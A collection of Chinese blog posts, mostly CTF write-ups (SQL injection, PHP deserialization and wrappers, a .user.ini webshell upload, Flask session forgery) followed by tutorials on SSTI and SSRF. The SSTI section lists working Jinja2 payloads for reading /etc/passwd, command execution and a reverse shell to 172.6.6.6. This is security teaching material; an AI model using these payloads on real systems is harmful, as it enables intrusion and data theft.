[{"title":"强网杯 2019-随便注","url":"http://example.com/2021/01/26/强网杯-2019-随便注/","content":"\n\n输入单引号报错，\n\n单引号闭合\n\n两个字段。\n\n好家伙，select给我ban了\n\n\n好家伙内联注释也用不了。\n\n\n堆叠注入可以，查到了库名和表名。\n\n\n分别查询 两个字段里面的信息\n在windows系统下，反单引号（`）是数据库、表、索引、列和别名用的引用符\n分析可知\n\n输出点应该是在 id字段\n\nflag存在于supersqli数据库中的1919810931114514表的flag字段。\n\n\n下面就要开始骚姿势了。\n由于正则字段中的数据是查询不出来了的，只有两种方式，\n\n预编译绕过正则\n\n将flag所在的表和flag都变成words和id 直接查询输出\n\n\n预编译\nset 用于设置变量名和值prepare 用于预备一个语句，并赋予名称，以后可以引用该语句execute 执行语句deallocate prepare 用来释放掉预处理的语句\n\n因此构造payload\nset  @sql&#x3D;CONCAT(&#39;se&#39;,&#39;lect * from &#96;1919810931114514&#96;;&#39;);prepare test from @sql;EXECUTe test;\n\n1&#39;set  @sql=CONCAT(&#39;se&#39;,&#39;lect * from 1919810931114514;&#39;);prepare test from @sql;EXECUTe test;#\n\nstrstr（）函数可以大小写绕过\n修正payload：\n1&#39;;Set @sql &#x3D; CONCAT(&#39;se&#39;,&#39;lect * from &#96;1919810931114514&#96;;&#39;);Prepare test from @sql;EXECUTe test;#\n\n\n得到flag\n修改表名\n修改表名(将表名user改为users)alter table user rename to users;修改列名(将字段名username改为name)alter table users change uesrname name varchar(30);\n\n因此构造payload：\nalert table words rename to 123;alert table &#96;1919810931114514&#96; rename to words;alert table words change flag id int(40);\n\n1&#39;;alert table words rename to     123;alert table &#96;1919810931114514&#96; rename to words;alert table words change flag id varchar(50);#\n\n\n使用1‘ or 1=1 # 得到flag。\n","categories":["CTF题解"],"tags":["BUUCTF"]},{"title":"网鼎杯 2018-Fakebook","url":"http://example.com/2021/01/26/网鼎杯-2018-Fakebook/","content":"\n打开题目注册登录 得到如上界面\n\n查看源码，发现一个view.php\n\n输出单引号报错，可能存在sql注入，进行下一步尝试。\nview.php?no&#x3D;1 and 1&#x3D;1view.php?no&#x3D;1 and 1&#x3D;2view.php?no&#x3D;1 order by 5view.php?no&#x3D;0 union select 666,777,888,999这里发现触发了WAF，尝试内联注释，混淆绕过view.php?no&#x3D;0 &#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F; 666,777,888,999view.php?no&#x3D;0 &#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F; 666,database(),888,999库名：fakebookview.php?no&#x3D;0 &#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F; 1,table_name ,3,4 from information_schema.tables where table_schema&#x3D;&#39;fakebook&#39;表名：usersview.php?no&#x3D;0 &#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F; 1,column_name,3,4 from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;users&#39;字段名：no username passwd dataview.php?no&#x3D;0 &#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F; union&#x2F;**&#x2F;select 1,data,3,4 from fakebook.usersO:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:123;s:4:&quot;blog&quot;;s:12:&quot;ww.baidu.com&quot;;&#125;\n\n得到一个反序列化串\n用dirsearch扫一遍目录啥也没有\n查看robots.txt（常用知识点一定要记住）\n\n下载下来得到 一份源码\n&lt;?phpclass UserInfo&#123;    public $name = &quot;&quot;;    public $age = 0;    public $blog = &quot;&quot;;    public function __construct($name, $age, $blog)  //赋值u    &#123;        $this-&gt;name = $name;        $this-&gt;age = (int)$age;        $this-&gt;blog = $blog;    &#125;    function get($url)  //自定义函数    &#123;\t    \t//初始化 cURL 会话        $ch = curl_init();\t\t//设置url和相对应的选项        curl_setopt($ch, CURLOPT_URL, $url);        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);\t\t//抓取url并把它传递给浏览器        $output = curl_exec($ch);        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);        if($httpCode == 404) &#123;            return 404;        &#125;\t\t//关闭curl资源，并释放系统资源        curl_close($ch);\t        return $output;    &#125;    public function getBlogContents ()    &#123;        return $this-&gt;get($this-&gt;blog);    &#125;    public function isValidBlog ()    &#123;        $blog = $this-&gt;blog;        return preg_match(&quot;/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]&#123;2,6&#125;(\\:[0-9]+)?(\\/\\S*)?$/i&quot;, $blog);    &#125;&#125;\n\n思路明确：利用反序列化和伪协议读取直接flag.php\n\n结合之前的报错信息，可以推测路径为 /var/www/html/flag.php\n因此 写php代码 构建payload\n\n因为data是第四个字段 因此最终的payload为\nhttp://b5de29d4-cf0b-47f7-a63d-7edf1fc2a2c4.node3.buuoj.cn/view.php?no=0%20union/**/select%201,2,3,%27O:8:%22UserInfo%22:3:&#123;s:4:%22name%22;s:5:%22admin%22;s:3:%22age%22;i:123;s:4:%22blog%22;s:29:%22file:///var/www/html/flag.php%22;&#125;%27\n","categories":["CTF题解"],"tags":["BUUCTF"]},{"title":"ZJCTF 2019-NiZhuanSiWei","url":"http://example.com/2021/01/26/ZJCTF-2019-NiZhuanSiWei/","content":"知识点php伪协议\nhttps://www.anquanke.com/post/id/202510#h3-3\nhttps://www.cherrygk.cn/2018/07/12/phpagree/\n解题\n审计代码，需要 txt  file password三个参数，分段绕过\nif(isset($text)&amp;&amp;(file_get_contents($text,&#39;r&#39;)===&quot;welcome to the zjctf&quot;))\n这里需要我们对text传参，并让file_get_contents()函数读取内容为 welcome to the zjctf\n因此使用 ?text=data:text/plain,welcome to the zjctfdata://伪协议实现绕过。\n\n过滤了 关键字flag\n\n这里提示读取useless.php，因此file=useless.php。但是php文件会被解析不能输出，因此，用base64编码读取\nphp://filter/read=convert.base64-encode/resource=useless.php\n\n读取到useless.php内容\n\n反手写一个反序列化生成payload：\npassword=O:4:&quot;Flag&quot;:2:&#123;s:4:&quot;file&quot;;N;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;&#125;\n最终payload\n?text=data:text/plain,welcome%20to%20the%20zjctf&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;\n\n","categories":["CTF题解"],"tags":["BUUCTF"]},{"title":"BJDCTF2020 EasyMD5","url":"http://example.com/2021/01/26/BJDCTF2020-EasyMD5/","content":"知识点：MD5 \n\nmd5 bypass\nmd5()或者sha1()之类的函数计算的是一个字符串的哈希值，对于数组则返回false，如果都是数组则双双返回FALSE, 两个FALSE相等得以绕过\n解题：\n\n\n输入框传参会是GET传参，查看返回包请求头发现提示，这里尝试了很多次这里我都绕不过去，一次看博客得到：\n传参?password=ffifdyop\n原理：\n经过md5加密后：276f722736c95d99e921722cf9ed621c，Mysql 刚好又会吧 hex 转成 ascii 解释，再转换为字符串：’or’6&lt;乱码&gt; 即  &#39;or&#39;66�]��!r,��b 起始。只要是万能密码就行可以采用md5截断爆破，但是我命不好跑了半小时没跑出来 就直接用网上师傅们的了。\n用途：\nselect * from admin where password=&#39;&#39;or&#39;6&lt;乱码&gt;&#39;\n就相当于select * from admin where password=&#39;&#39;or 1 实现sql注入\n\n查看源码，发现需要md5弱类型比较，有两种做法\n第一种弱类型 传入连个0e…的值e后面的会被当做科学计数法 0 = 0 实现绕过\n第二种数组编码之后会返回false false=false 实现绕过\n\n===弱类型不可以了，但是可以第二种方法\n\n","categories":["CTF题解"],"tags":["BUUCTF"]},{"title":"UNCTF之easyunserialize","url":"http://example.com/2021/01/26/UNCTF之easyunserialize/","content":"知识点：PHP 在反序列化时，底层代码是以;作为字段的分隔，以&#125;作为结尾(数组、对象等类型)；反序列化时，结尾后的字符串会被忽略掉，当出现字符串替换函数得时候，就可以存在反序列化逃逸漏洞\n当替换后字符变多：由于膨胀，导致后面的字符被挤掉，所以执行我们传入的代码\n当替换后字符变少：由于缩水，导致前面的字符被吃掉了，所以执行了我们后面构造的代码\n解题：\n经过分析，构造payload。\n\n;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;&#125;\n得到我们要传入的参数（起始也可以直接写出来要是熟悉的话）\n我们发现这串字符有 29个。而我们根据替换只能控制溢出为4的倍数，因此这里有个骚姿势传入一个没有用的参数，使得我们构造的传参为4的倍数\npaylaod：&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;s:5:&quot;aaaaa&quot;;s:4:&quot;easy&quot;;&#125;\n此时是52个字符为4的倍数，构造脚本。\n\n\n","categories":["CTF题解"],"tags":["UNCTF"]},{"title":"# BUUCTF之[极客大挑战 2019]BuyFlag","url":"http://example.com/2021/01/26/BUUCTF之-极客大挑战-2019-BuyFlag/","content":"知识点is_numberic:可以使用%00和%20绕过\nstrcmp()：这一个漏洞适用与5.3之前版本的php\nstrcmp(&#x27;str1&#x27;,&#x27;str2&#x27;)    if(str1&gt;str2) return &gt;0    if(str1&lt;str2) return &lt;0    if(str1 == str2) return 0    if(str1 = arry[] &amp;&amp; str2 = string) return 0\n\n\n\n解题\n打开题目 打开payflag的功能菜单，提示flag需要100000000 money\n\n结合上述提示可知 获得flag需要三个步骤\n1.a student from CUIT\n2.输入正确的密码\n3.输入正确的金额\n第一点是身份验证，可以看一下cookie\n](https://imgchr.com/i/sjNmZT)\n可以发现cookie很简单 就是user=0 因此是不是可以推测 user=1就可以完成CUIT的身份确认\n\n查看源码发现这里有对密码的提示，\n\n根据审计可知 要绕过is_number函数 且 password值为404 所以 POST传参为：password=404%00\n\n依次修改cookie和POST传参，\n\n下一步就是要传入money的值\n\n这里提示数字太长了，因此我们可以推测可能是strcmp比较，\n\n抓个包 发现php版本为5.3.3 可以使用 数组绕过\n\n","categories":["CTF题解"],"tags":["BUUCTF"]},{"title":"BUUCTF之[SUCTF 2019]CheckIn","url":"http://example.com/2021/01/26/BUUCTF之-SUCTF-2019-CheckIn/","content":"知识点.user.ini 是什么？​        .user.ini实际上就是自定义的php.ini.通过使用两个方法auto_prepend_file、auto_append_file实现类似于文件包含的功能。\n使用条件：(1)服务器脚本语言为PHP(2)对应目录下面有可执行的php文件(3)服务器使用CGI／FastCGI模式\n解题\n打开图片上传一个正常的 .png 的图片 观察返回的信息 返回了目录路径 返回了当前文件夹存在的 东西\n\n上传图片马 发现 会对图片信息进行  过滤和查看  。  这里 &lt;? 被过滤了 只能换一个 马\n&lt;script language=&quot;pHp&quot;&gt;@eval($_POST[8])&lt;/script&gt;\n\n经过测试 几乎所有后缀 名 全被ban了，只能想想骚姿势\n\n正常不修改文件后缀，可以上传图片马，因此可以使用之前提到的 .user.ini 将图片马 包含到 已经存在的 index.php 里面 。\n\n第一次上传失败了  原因是 不是图片  一次 在构造时 加上一个图片识别的前缀\n\n\n这样就成功上传，可以去 快落的连接蚁剑了。\n\n连接成功 得到flag。\n","categories":["CTF题解"],"tags":["BUUCTF"]},{"title":"BUUCTF之[HCTF 2018]admin","url":"http://example.com/2021/01/26/BUUCTF之-HCTF-2018-admin/","content":"知识点flask–session存储机制\n实现\nfrom datetime import timedeltafrom flask import Flask, request, redirect, url_for, sessionapp = Flask(__name__)#设置我们的秘钥 用于对sessionid进行加密app.secret_key=&quot;lH4WHi5amT0ZqykHvLofllRJu3UN1uzmeUN0z2IiacjDUb5TLU3ZTtUP5VJqgkMY&quot;#设置session的过期时间app.permanent_session_lifetime = timedelta(days=7)\n\n调用\n@app.route(&#x27;/&#x27;)def index():    #访问首页时 如果是登录状态 则 提示欢迎信息    username = session.get(&quot;username&quot;)    if username:        #删除session的数据        return &quot;欢迎回来%s&quot;%username    #如果没有登录 跳转到登录页面    return redirect(url_for(&quot;login&quot;))#登录的路由@app.route(&#x27;/login&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])def login():    if request.method == &#x27;GET&#x27;:        with open(&quot;login.html&quot;) as f:            login_html_content = f.read()            return login_html_content    #Post处理    username = request.form.get(&quot;username&quot;)    password = request.form.get(&quot;password&quot;)    #验证登录信息    if username == &#x27;zx&#x27; and password==&quot;123&quot;:        print(&quot;登录成功&quot;)        #将我们的状态数据保存到session        session[&quot;username&quot;] = username        #设置session是否持久化（） 默认为false（会话结束自动删除）        session.permanent = True        # #删除字典数据        # session.pop(&quot;username&quot;)        return redirect(url_for(&quot;index&quot;))    else:        return &#x27;登录失败&#x27;if __name__ == &#x27;__main__&#x27;:    app.run()\n\n\n\n解题：\n登陆页面 发现有两个功能 登陆和注册 分别检测 两个功能。 登陆功能没有什么点可以用，只能注册，注册一个test用户登陆看看！\n\n发现有四个功能，返回主页面，提交留言，修改密码，登出\n\n在查看一手源代码，看来在提示要admin登陆了。\n\n修改密码页面存在提示，github上面应该是他的源码，去嫖一手。\n\n这里用到了session，因此可以想到篡改session实现admin登陆\n\n得到 test账号的session 尝试解密\n\n根据脚本得到解密串:\n&#123;&#39;_fresh&#39;: True, &#39;_id&#39;: b&#39;4765861b12328638115df84695bf022807817e5be468dac58d116b15882a91c9cddde6325d9304aabdb9f3edee5ecb738aaa789431c594eb94e960a90fb685ee&#39;, &#39;csrf_token&#39;: b&#39;ebf9106fbf271c5ec3868795513cda5fc4589b28&#39;, &#39;image&#39;: b&#39;9L7q&#39;, &#39;name&#39;: &#39;test&#39;, &#39;user_id&#39;: &#39;10&#39;&#125;\n将text改为admin可得\n&#123;&#39;_fresh&#39;: True, &#39;_id&#39;: b&#39;4765861b12328638115df84695bf022807817e5be468dac58d116b15882a91c9cddde6325d9304aabdb9f3edee5ecb738aaa789431c594eb94e960a90fb685ee&#39;, &#39;csrf_token&#39;: b&#39;ebf9106fbf271c5ec3868795513cda5fc4589b28&#39;, &#39;image&#39;: b&#39;9L7q&#39;, &#39;name&#39;: &#39;admin&#39;, &#39;user_id&#39;: &#39;10&#39;&#125;\n根据flask session的特性 我们还必须找到 加密所需的密钥\n\n在 config.py中找到密钥\n\n在得到加密之后的字符串，将其为session赋值即可admin登陆。\n\n得到flag。\n","categories":["CTF题解"],"tags":["BUUCTF"]},{"title":"浅析SSTI漏洞","url":"http://example.com/2021/01/26/浅析SSTI漏洞/","content":"python-flask-ssti(模版注入漏洞)原理：SSTI(Server-Side Template Injection) 服务端模板注入，就是服务器模板中拼接了恶意用户输入导致各种漏洞。通过模板，Web应用可以把输入转换成特定的HTML文件或者email格式。\n模板注入和SQL注入很像，都是用户输入被当做代码执行（因此，“用户的输入都是不可信的”）这句话整的很实用。\n前置知识：1.运行一个一个最小的 Flask 应用from flask import Flaskapp = Flask(__name__)&quot;&quot;&quot;第一部分，初始化：所有的Flask都必须创建程序实例，web服务器使用wsgi协议，把客户端所有的请求都转发给这个程序实例程序实例是Flask的对象，一般情况下用如下方法实例化Flask类只有一个必须指定的参数，即程序主模块或者包的名字，__name__是系统变量，该变量指的是本py文件的文件名`&quot;&quot;&quot;`@app.route(&#x27;/&#x27;)def hello_world():    return __name__#  第二部分，路由和视图函数：#  客户端发送url给web服务器，web服务器将url转发给flask程序实例，程序实例#  需要知道对于每一个url请求启动那一部分代码，所以保存了一个url和python函数的映射关系。#  处理url和函数之间关系的程序，称为路由#  在flask中，定义路由最简便的方式，是使用程序实例的app.route装饰器，把装饰的函数注册为路由 if __name__ == &#x27;__main__&#x27;:    print(&#x27;dd&#x27;,__name__)    app.run()#  第三部分：程序实例用run方法启动flask集成的开发web服务器#  __name__ == &#x27;__main__&#x27;是python常用的方法，表示只有直接启动本脚本时候，才用app.run方法#  如果是其他脚本调用本脚本，程序假定父级脚本会启用不同的服务器，因此不用执行app.run()#  服务器启动后，会启动轮询，等待并处理请求。轮询会一直请求，直到程序停止。\n\n如上述代码所示，app是flask的实例，功能就是接受来自web服务器的请求，\n\n\n浏览器将请求给web服务器，web服务器将请求给app ,\n\napp收到请求，通过路由找到对应的视图函数，然后将请求处理，得到一个响应response\n\n然后app将响应返回给web服务器，\n\nweb服务器返回给浏览器，\n\n浏览器展示给用户观看，流程完毕。\n2.jinja2jnja2是Flask作者开发的一个模板系统，起初是仿django模板的一个模板引擎，为Flask提供模板支持，由于其灵活，快速和安全等优点被广泛使用。\n\n​        jinja2 存在着三种特殊的语句：\n\n&#123;%   %&#125;：控制结构。\n\n&#123;&#123;   &#125;&#125;：变量取值。被两个括号包裹的内容会输出其表达式的值\n\n&#123;#     #&#125;：注释。\njinja2模板中使用&#123;&#123;   &#125;&#125;语法表示一个变量，他是一种特殊的占位符。当利用jinja2进行渲染时，他会把这些特殊的占位符进行填充/替换，jinja2支持python中所有的python数据类型。\njinja2中的过滤器：\n变量名后面加一根竖线，再跟上过滤器的名字就能使用特定的过滤器修改变量了。\n\n\n\nsafe 过滤器值得特别说明一下。默认情况下，出于安全考虑， Jinja2 会转义所有变量。很多情况下需要显示变量中存储的 HTML 代码，这时就可使用 safe 过滤器。\ninja2中的过滤器可以理解为是jinja2里面的内置函数和字符串处理函数。\n3.python魔法函数​    Python内置的以双下划线开头并以双下划线结尾的函数（不能自己定义，没有用），如_等很多，用于实现并定制很多特性，非常灵活，且是隐式调用的。　\n​    魔法函数会直接影响到Python语法本身，如让类变成可迭代的对象，也会影响Python的一些内置函数的调用，如实现len()能对对象调用len()方法。\n常用的魔法函数：https://www.cnblogs.com/small-office/p/9337297.html\n4.python中的object​    在python的object类中集成了很多的基础函数，我们想要调用的时候也是需要用object去操作的，这是两种创建object的方法\nPython中一些常见的特殊方法：\n__class__返回调用的参数类型。__base__返回基类__mro__允许我们在当前Python环境下追溯继承树__subclasses__()返回子类\n\n　\n\n\n   ​    \nssti漏洞检测   检测到模板注入漏洞后，需要准确识别模板引擎的类型。神器Burpsuite 自带检测功能，并对不同模板接受的 payload 做了一个分类，并以此快速判断模板引擎：\n   \n漏洞利用1.payload原理​    ·Jinja2 模板中可以访问一些 Python 内置变量，如[] {} 等，并且能够使用 Python 变量类型中的一些函数。加上python中的魔术方法，object类中的基本方法。结合这几个 我们可以 实现任意代码的执行。\n2.payload具体思路\n现在我们的思路就是从一个内置变量调用__class__.base__等隐藏属性，去找到一个函数，然后调用其__globals[&#x27;builtins&#x27;]即可调用eval等执行任意代码。\n\nbuiltins即是引用，Python程序一旦启动，它就会在程序员所写的代码没有运行之前就已经被加载到内存中了,而对于builtins却不用导入，它在任何模块都直接可见，所以这里直接调用引用的模块\n &#x27;&#x27;.__class__.__base__.__subclasses__()# 返回子类的列表 [,,,...]#从中随便选一个类,查看它的__init__ &#x27;&#x27;.__class__.__base__.__subclasses__()[30].__init__slot wrapper &#x27;__init__&#x27; of &#x27;object&#x27; objects# wrapper是指这些函数并没有被重载，这时他们并不是function，不具有__globals__属性#再换几个子类，很快就能找到一个重载过__init__的类，比如 &#x27;&#x27;.__class__.__base__.__subclasses__()[5].__init__ &#x27;&#x27;.__class__.__base__.__subclasses__()[5].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;]#然后用eval执行命令即可\n\n常用的payloadpython2：​    文件的写入和读取\n#读文件&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__[&#x27;open&#x27;](&#x27;/etc/passwd&#x27;).read()&#125;&#125;  &#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40](&#x27;/etc/passwd&#x27;).read()&#125;&#125;#写文件&#123;&#123; &#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40](&#x27;/tmp/1&#x27;).write(&quot;&quot;) &#125;&#125;\n\n​    任意执行\n​    每次执行都要先写然后编译执行\n&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40](&#x27;/tmp/owned.cfg&#x27;,&#x27;w&#x27;).write(&#x27;code&#x27;)&#125;&#125;  &#123;&#123; config.from_pyfile(&#x27;/tmp/owned.cfg&#x27;) &#125;&#125;  \n\n​    写入一次\n&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40](&#x27;/tmp/owned.cfg&#x27;,&#x27;w&#x27;).write(&#x27;from subprocess import check_output\\n\\nRUNCMD = check_output\\n&#x27;)&#125;&#125;  &#123;&#123; config.from_pyfile(&#x27;/tmp/owned.cfg&#x27;) &#125;&#125;  &#123;&#123; config[&#x27;RUNCMD&#x27;](&#x27;/usr/bin/id&#x27;,shell=True) &#125;&#125;    \n\n​    不回显的\n&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__[&#x27;eval&#x27;](&#x27;1+1&#x27;)&#125;&#125;&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__[&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;)&#125;&#125;\n\n​    任意执行只需要一条指令\n&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__[&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;)&#125;&#125;(这条指令可以注入，但是如果直接进入python2打这个poc，会报错，用下面这个就不会，可能是python启动会加载了某些模块)  &#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;)&#125;&#125;(system函数换为popen(&#x27;&#x27;).read()，需要导入os模块)  &#123;&#123;().__class__.__bases__[0].__subclasses__()[71].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()&#125;&#125;(不需要导入os模块，直接从别的模块调用)\n\n​    总结\n通过某种类型(字符串:&quot;&quot;，list:[]，int：1)开始引出，__class__找到当前类，__mro__或者__base__找到__object__，前边的语句构造都是要找这个。然后利用object找到能利用的类。还有就是&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#x27;os&#x27;].system(&#x27;ls&#x27;)&#125;&#125;这种的，能执行，但是不会回显。一般来说，python2的话用file就行，python3则没有这个属性。\n\npython3​        因为python3没有file了，所以用的是open\n​        文件读取\n&#123;&#123;().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[%27open%27](%27/etc/passwd%27).read()&#125;&#125;\n\n​        任意执行\n&#123;&#123;().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;)&#125;&#125;\n\n​        命令执行\n&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;\n\n​        \nWAF绕过python2：[].__class__.__base__.__subclasses__()[71].__init__.__globals__[&#x27;os&#x27;].system(&#x27;ls&#x27;)[].__class__.__base__.__subclasses__()[76].__init__.__globals__[&#x27;os&#x27;].system(&#x27;ls&#x27;)&quot;&quot;.__class__.__mro__[-1].__subclasses__()[60].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#x27;)&quot;&quot;.__class__.__mro__[-1].__subclasses__()[61].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#x27;)&quot;&quot;.__class__.__mro__[-1].__subclasses__()[40](filename).read()&quot;&quot;.__class__.__mro__[-1].__subclasses__()[29].__call__(eval,&#x27;os.system(&quot;ls&quot;)&#x27;)().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__(&#x27;func_global&#x27;+&#x27;s&#x27;)[&#x27;linecache&#x27;].__dict__[&#x27;o&#x27;+&#x27;s&#x27;].__dict__[&#x27;sy&#x27;+&#x27;stem&#x27;](&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/172.6.6.6/9999 0&gt;&amp;1&quot;&#x27;)python3：&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.values()[13][&#x27;eval&#x27;]&quot;&quot;.__class__.__mro__[-1].__subclasses__()[117].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;]().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__(&#x27;__global&#x27;+&#x27;s__&#x27;)[&#x27;os&#x27;].__dict__[&#x27;system&#x27;](&#x27;ls&#x27;)\n\n例题演示题目：攻防世界之Web_python_template_injection\n连接：https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=1&amp;id=5408&amp;page=1\n\n打开题目提示存在 python 的模板注入\n\n传参之后页面报错 但是输入的参数 a和x 已经被成功输入。\n.访问http://192.168.100.161:62264/%7B%7B[].__class__.__base__.__subclasses__()%7D%7D,来查看所有模块\n\n3.os模块都是从warnings.catch_warnings模块入手的，在所有模块中查找catch_warnings的位置，为第59个\n4.访问http://192.168.100.161:62264/%7B%7B[].__class__.__base__.__subclasses__()[59].__init__.func_globals.keys()%7D%7D,查看catch_warnings模块都存在哪些全局函数，可以找到linecache函数，os模块就在其中\n\n5.使用[&#39;o&#39;+&#39;s&#39;],可绕过对os字符的过滤，访问http://192.168.100.161:62264/%7B%7B().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13][&#39;eval&#39;](&#39;__import__(%22os%22).popen(%22ls%22).read()&#39;%20)%7D%7D查看flag文件所在\n\n6.访问\n","categories":["漏洞总结"],"tags":["SSTI"]},{"title":"浅析SSRF漏洞","url":"http://example.com/2021/01/26/浅析SSRF/","content":"SSRF(Server-side Request Forge, 服务端请求伪造)什么是 SSRF他是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）\nSSRF 形成的原因​    大多数SSRF产生的原因是服务端提供了从其他服务器获取数据的功能,并且没有对目的地址做过滤和限制.比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载\n代码案例\n//curl造成的SSRFfunction curl($url)&#123;      $ch = curl_init();    curl_setopt($ch, CURLOPT_URL, $url);    curl_setopt($ch, CURLOPT_HEADER, 0);    curl_exec($ch);    curl_close($ch);&#125;$url = $_GET[&#x27;url&#x27;];curl($url);  //file_get_contents造成的SSRF$url = $_GET[&#x27;url&#x27;];echo file_get_contents($url);//fsockopen造成的SSRF&lt;?phpfunction Getfile($host, $port, $link)&#123;    $fp = fsockopen($host, intval($port), $errno, $errstr, 30);    if(!$fp)&#123;        echo &quot;$errstr (error number $errno) \\n&quot;;    &#125;else&#123;        $out = &quot;GET $link HTTP/1.1\\r\\n&quot;;        $out .= &quot;HOST $host \\r\\n&quot;;        $out .= &quot;Connection: Close\\r\\n\\r\\n&quot;;        $out .= &quot;\\r\\n&quot;;        fwrite($fp, $out);        $content = &#x27;&#x27;;        while(!feof($fp))&#123;            $contents .= fgets($fp, 1024);        &#125;        fclose($fp);        return $contents;    &#125;&#125;\n\n\n\nSSRF攻击流程假定 A 为一个公司的主站,所有人都可以访问, B 是该公司内部的一个网站,只有公司能为能够访问,且与 A 能够相互访问。\n正常用户：\n输入A网站URL –&gt; 发送请求 –&gt; A服务器接受请求，并处理 –&gt;返回用户响应\n此时如果A服务器接受请求是没有经过严格的过滤，导致A能够在B上获取数据，就会产生SSRF\n例如:\n正常用户输入的URL:http://www.123.com/index.php?img=www.aaa.com/1.jpg\n攻击者将www.aaa.com换成B的内网地址,如果存在就返回1XX | 2XX的状态码,不存在就会出现其他的状态码\n因此,SSRF漏洞就是通过篡改获取资源的请求发送给服务器，但是服务器并没有检测这个请求是否合法的，然后服务器以他的身份来访问其他服务器的资源。\nSSRF可能出现的地方(核心就是调用外部资源的所有参数都有可能)\n社交分享功能：获取超链接的标题等内容进行显示\n\n转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览\n\n在线翻译：给网址翻译对应网页的内容\n\n图片加载/下载：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片\n\n图片/文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一个好的用户体验\n\n网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作\n\n数据库内置功能：数据库的比如mongodb的copyDatabase函数\n\n邮件系统：比如接收邮件服务器地址\n\n编码处理, 属性信息处理，文件处理：比如fpmg，ImageMagick，docx，pdf，xml处理器等\n\n从远程服务器请求资源（upload from url 如discuz！；import &amp; expost rss feed 如web blog；使用了xml引擎对象的地方 如wordpress xmlrpc.php）\n\n将url换成我们的DNS服务器，通过查看DNFlog平台日志看是否有服务器ip判断是否有SSRF漏洞\n\n\nSSRF的危害\n让服务端去访问相应的网址\n\n让服务端去访问自己所处内网的一些指纹文件来判断是否存在相应的cms\n\n可以使用file、dict、gopher[11]、ftp协议进行请求访问相应的文件\n\n攻击内网web应用（可以向内部任意主机的任意端口发送精心构造的数据包payload）\n\n判断内网主机是否存活：方法是访问看是否有端口开放\n\nDoS攻击（请求大文件，始终保持连接keep-alive 